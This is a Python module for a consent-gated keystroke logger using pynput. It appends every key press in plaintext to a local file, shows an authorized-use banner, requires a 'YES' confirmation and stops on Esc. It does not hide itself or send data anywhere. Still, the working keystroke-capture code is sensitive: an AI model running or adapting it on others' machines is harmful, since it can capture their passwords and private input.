"""Educational keyboard event logger using pynput (authorized local use only).

Importing this module has no side effects and never starts an OS keyboard hook.
Interactive or CLI execution requires explicit user consent and provides an
``Esc`` stop key as well as ``KeyboardInterrupt`` handling.
"""

from __future__ import annotations

import argparse
import os
import sys
from typing import Any, Callable, Sequence

DEFAULT_LOG_PATH = os.path.join(os.path.expanduser("~"), "log.txt")
# Backward-compatible module attribute name.
path = DEFAULT_LOG_PATH

SAFETY_BANNER = (
    "=== EDUCATIONAL / AUTHORIZED USE ONLY ===\n"
    "This tool records keystrokes in plaintext to a local file.\n"
    "Run ONLY on a system you own or have explicit written authorization to test.\n"
    "Avoid typing passwords, tokens, or sensitive personal data while active."
)


def format_key_event(key: Any) -> str:
    """Format a pynput key object into a printable log token.

    Uses ``key.char`` only when it is not ``None``; otherwise falls back to
    ``str(key)`` so dead keys or special ``KeyCode`` objects never log ``"None"``.
    """
    char = getattr(key, "char", None)
    if char is not None:
        return str(char)
    return str(key)


def append_log_entry(log_path: str | os.PathLike[str], text: str) -> bool:
    """Append a single formatted entry line to ``log_path``.

    Returns ``True`` on success, or ``False`` if an ``OSError`` occurs.
    """
    target = os.fspath(log_path)
    try:
        parent = os.path.dirname(os.path.abspath(target))
        if parent:
            os.makedirs(parent, exist_ok=True)
        with open(target, "a", encoding="utf-8") as file:
            file.write(f"{text}\n")
        return True
    except OSError as exc:
        print(f"Warning: Failed to write log entry to {target}: {exc}", file=sys.stderr)
        return False


def create_on_press(
    log_path: str | os.PathLike[str] = DEFAULT_LOG_PATH,
) -> Callable[[Any], None]:
    """Create a ``pynput`` ``on_press`` callback bound to ``log_path``."""

    def _on_press(key: Any) -> None:
        append_log_entry(log_path, format_key_event(key))

    return _on_press


def on_release(key: Any, stop_key: Any = None) -> bool | None:
    """Stop the listener (return ``False``) when ``Esc`` or ``stop_key`` is released."""
    resolved_stop = stop_key
    if resolved_stop is None:
        try:
            from pynput import keyboard

            resolved_stop = keyboard.Key.esc
        except ImportError:
            resolved_stop = None

    if resolved_stop is not None and key == resolved_stop:
        return False
    if resolved_stop is None and (
        getattr(key, "name", None) == "esc" or str(key) == "Key.esc"
    ):
        return False
    return None


def keyPressed(key: Any, log_path: str | os.PathLike[str] | None = None) -> bool:
    """Backward-compatible helper to log a single key press."""
    target = path if log_path is None else log_path
    return append_log_entry(target, format_key_event(key))


def keyReleased(key: Any) -> bool | None:
    """Backward-compatible alias for :func:`on_release`."""
    return on_release(key)


def _import_pynput_keyboard() -> Any:
    """Lazily import ``pynput.keyboard`` with an actionable error message."""
    try:
        from pynput import keyboard

        return keyboard
    except ImportError as exc:
        raise RuntimeError(
            "The 'pynput' package is required to run the keyboard listener. "
            "Install dependencies with: pip install -r requirements.txt"
        ) from exc


def create_listener(
    log_path: str | os.PathLike[str] = DEFAULT_LOG_PATH,
    stop_key: Any = None,
) -> Any:
    """Instantiate (without starting) a ``pynput.keyboard.Listener``."""
    keyboard = _import_pynput_keyboard()
    resolved_stop = keyboard.Key.esc if stop_key is None else stop_key
    return keyboard.Listener(
        on_press=create_on_press(log_path),
        on_release=lambda key: on_release(key, stop_key=resolved_stop),
    )


def run_listener(
    log_path: str | os.PathLike[str] = DEFAULT_LOG_PATH,
    stop_key: Any = None,
) -> None:
    """Run the keyboard listener until ``Esc`` is pressed or interrupted."""
    listener = create_listener(log_path=log_path, stop_key=stop_key)
    try:
        with listener as active_listener:
            active_listener.join()
    except KeyboardInterrupt:
        pass


def build_parser() -> argparse.ArgumentParser:
    """Build CLI argument parser for the educational keyboard listener."""
    parser = argparse.ArgumentParser(
        description="Educational keyboard listener (authorized local testing only)."
    )
    parser.add_argument(
        "--log-file",
        default=DEFAULT_LOG_PATH,
        help=f"Path to append key logs (default: {DEFAULT_LOG_PATH})",
    )
    parser.add_argument(
        "--i-understand-educational-use",
        action="store_true",
        help="Confirm authorized educational/local testing use without interactive prompt.",
    )
    return parser


def main(
    argv: Sequence[str] | None = None,
    input_fn: Callable[[str], str] = input,
    output_fn: Callable[[str], None] = print,
) -> int:
    """CLI entrypoint with explicit consent gate and clear stop instructions."""
    args = build_parser().parse_args(argv)
    log_path = os.path.abspath(args.log_file)

    output_fn(SAFETY_BANNER)
    output_fn(f"Target log file: {log_path}")
    output_fn("Press Esc (or Ctrl+C in terminal) to stop logging.")

    if not args.i_understand_educational_use:
        try:
            response = input_fn("Type 'YES' to confirm authorized local use: ").strip()
        except (EOFError, KeyboardInterrupt):
            output_fn("\nCancelled: confirmation not provided.")
            return 1
        if response != "YES":
            output_fn("Cancelled: explicit 'YES' confirmation is required.")
            return 1

    try:
        run_listener(log_path=log_path)
    except RuntimeError as exc:
        print(f"Error: {exc}", file=sys.stderr)
        return 1

    output_fn("Listener stopped.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
